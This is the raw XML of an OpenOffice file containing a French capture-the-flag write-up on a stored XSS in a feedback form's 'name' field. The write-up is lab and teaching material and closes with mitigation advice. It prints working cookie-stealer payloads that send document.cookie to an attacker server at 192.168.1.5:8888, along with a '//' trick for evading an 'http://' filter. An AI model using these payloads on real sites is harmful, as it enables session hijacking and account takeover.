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E530000159B0E3C41D6.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700004FB000002FA661059714.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003D3000000E7932CF7BA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justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Times New Roman" fo:font-size="12pt" style:text-underline-style="none" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P4"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Courier New" fo:font-size="10pt" style:text-underline-style="none" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:text-underline-style="none" fo:font-weight="normal"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Footnote">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:text-indent="0cm" style:auto-text-indent="false"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties style:font-name="Courier New" fo:font-size="10pt" style:text-underline-style="none" fo:font-weight="normal"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fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>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justify" style:justify-single-word="false"/>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font-name="Courier New" fo:font-size="10pt" style:font-size-asian="10pt" style:font-size-complex="10pt"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:font-size-asian="11pt" style:font-size-complex="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XSS in feedback</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P10">EXPLICATION</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Comme relevé durant la phase d'énumération (voir ENUMERATION – partie 8), l'application met à notre disposition une page permettant de publier des messages de feedback :</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><draw:frame draw:style-name="fr1" draw:name="images7" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="10.164cm" draw:z-index="0"><draw:image xlink:href="Pictures/2000000700004FB000002FA661059714.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P1">Comme également relevé dans la phase d'énumération, le champ <text:span text:style-name="T1">message </text:span><text:span text:style-name="T2">semble correctement valider le user input. Ce qui ne semble pas être le cas dans le cadre du champ </text:span><text:span text:style-name="T1">name</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P1"><text:span text:style-name="T2">Celui-ci est limité, dans le front end, à 10 caractères maximum, ce qui est un peu court pour un payload XSS. Il nous suffit cependant, pour contourner cette restriction, d'intercepter la requête avec Burp et d'y modifier directement le champ </text:span><text:span text:style-name="T1">name </text:span><text:span text:style-name="T2">; si le site est mal configuré, aucun check n'est effectué en back end :</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7"><draw:frame draw:style-name="fr2" draw:name="images1" text:anchor-type="paragraph" svg:width="15.954cm" svg:height="5.532cm" draw:z-index="1"><draw:image xlink:href="Pictures/2000000700003E530000159B0E3C41D6.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3">Notre payload ici est le suivant :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">&lt;img src=x onerror="alert(42)"&gt;</text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P4">Il s'agit d'un simple payload testant la vulnérabilité d'une page à une faille XSS. Et on récupère bien une alerte avec marqué "42" chaque fois qu'on se redirige sur la page, le champ "name" est vulnérable à une faille XSS.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Il s'agit ici d'une faille de type <text:a xlink:type="simple" xlink:href="https://portswigger.net/web-security/cross-site-scripting/stored" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">stored XSS</text:a><text:span text:style-name="T1"> </text:span>(ou persistent XSS). Ce qui veut dire qu'à chaque fois qu'un utilisateur se rendra sur la page où notre payload Javascript se situe, ce dernier sera exécuté <text:span text:style-name="T1">dans le context du navigateur de la victime</text:span>.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Dans ce cadre, le fait de faire apparaître une alerte n'est pas très utile. Cependant, il peut être très intéressant d'utiliser un payload qui envoie à un serveur web que nous contrôlons les cookies de la victime. Il suffit qu'il s'agisse de l'administrateur du site, qu'il soit authentifié et que son cookie représente cette authentification pour lui voler ce cookie et pouvoir usurper son identité sur le site.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Les payloads pour de tels <text:span text:style-name="T3">cookie stealers </text:span><text:span text:style-name="T4">pourraient ressembler à cela (toujours en travaillant au sein d'un tag html </text:span><text:span text:style-name="T5">img</text:span><text:span text:style-name="T4">, les tags </text:span><text:span text:style-name="T5">script </text:span><text:span text:style-name="T4">ne semblent pas produire l'effet désiré) :</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P6">&lt;img src=x onerror=this.src='http://192.168.1.5:8888/cat.png?cookie=' + document.cookie&gt;</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">&lt;img src=x onerror=alert('stolen'); this.onerror=null; this.src='http://192.168.1.5:8888/cat.png?cookie=' + document.cookie&gt;</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P4">Il faut faire attention, dans le cadre du premier payload, à ce que le fichier <text:span text:style-name="T1">cat.png </text:span>existe bien sur notre serveur malicieux, sinon le <text:span text:style-name="T1">onerror </text:span>s'exécutera en boucle (un problème que le second payload résoud).</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Quoi qu'il en soit, avec l'un ou l'autre de ces payloads, on ne reçoit <text:span text:style-name="T1">pas </text:span>sur notre serveur malicieux qui tourne en local la requête. On s'aperçoit en réalité que notre browser envoie bien les requêtes, mais considère <text:span text:style-name="T6">192.168.1.5:8888/cat.png?cookie=</text:span> comme un <text:span text:style-name="T1">path relatif</text:span>, car un <text:span text:style-name="T1">filtre supprime les patterns du type http://</text:span>. </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Typiquement, voilà la requête qui est envoyée par notre XSS en l'état :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"><draw:frame draw:style-name="fr3" draw:name="images2" text:anchor-type="paragraph" svg:width="15.663cm" svg:height="3.704cm" draw:z-index="2"><draw:image xlink:href="Pictures/2000000700003D3000000E7932CF7BA6.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P4">On voit qu'on l'envoie à 192.168.1.20, qui est en réalité l'application vulnérable, on interprête notre serveur comme un path relatif. Il existe des façons de bypass les regex qui interdisent les patterns comme <text:span text:style-name="T1">http:// </text:span>:</text:p>
      <text:p text:style-name="P4"><text:a xlink:type="simple" xlink:href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</text:a> </text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Par exemple, <text:span text:style-name="T7">//</text:span> est traduit par les navigateurs par <text:span text:style-name="T7">http://</text:span> ; on adapte donc notre payload, qui devient :</text:p>
      <text:p text:style-name="P6">&lt;img src=x onerror=this.onerror=null;this.src='//192.168.1.5:8888/?c=' + document.cookie&gt;</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Notre <text:span text:style-name="T7">//</text:span> permet d'esquiver le filtre (probablement une regex ?), et on récupère bien un hit sur notre <text:soft-page-break/>serveur web local. Notre faille XSS et le <text:span text:style-name="T3">cookie stealer </text:span><text:span text:style-name="T4">sont ainsi fonctionnels.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Malgré tout ça, on ne récupère pas de flag. On finit par se rendre compte que, pour obtenir le <text:span text:style-name="T1">flag</text:span>, il suffisait de taper le string "<text:span text:style-name="T1">script</text:span>" dans l'un des inputs<text:note text:id="ftn1" text:note-class="footnote"><text:note-citation>1</text:note-citation><text:note-body><text:p text:style-name="P8"><text:s/>: Voir même uniquement le caractère 'a' dans <text:span text:style-name="T1">name </text:span><text:span text:style-name="T2">et </text:span><text:span text:style-name="T1">message</text:span><text:span text:style-name="T2">, ce qui est un peu étrange.</text:span></text:p></text:note-body></text:note>. Il s'agissait alors probablement plutôt de nous faire prendre conscience de la possibilité d'une XSS plutôt que de nous la faire pratiquer.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P13">RESSOURCES </text:p>
      <text:p text:style-name="P4">Un petit script xss.py dans le dossier Ressources permet de révéler le flag.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:span text:style-name="T3">MITIGATION :</text:span></text:p>
      <text:p text:style-name="P14">&gt; Valider l'input utilisateur sur l'intégralité des champs.</text:p>
      <text:p text:style-name="P14">&gt; Ne pas se reposer sur des mécanismes de front-end pour réguler l'input utilisateur.</text:p>
      <text:p text:style-name="P1">&gt; Mettre en place des filtres XSS selon le framework utilisé.</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3M16S</meta:editing-duration>
    <meta:editing-cycles>7</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-11-03T13:11:53.38</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="3" meta:object-count="0" meta:page-count="3" meta:paragraph-count="29" meta:word-count="632" meta:character-count="4014"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>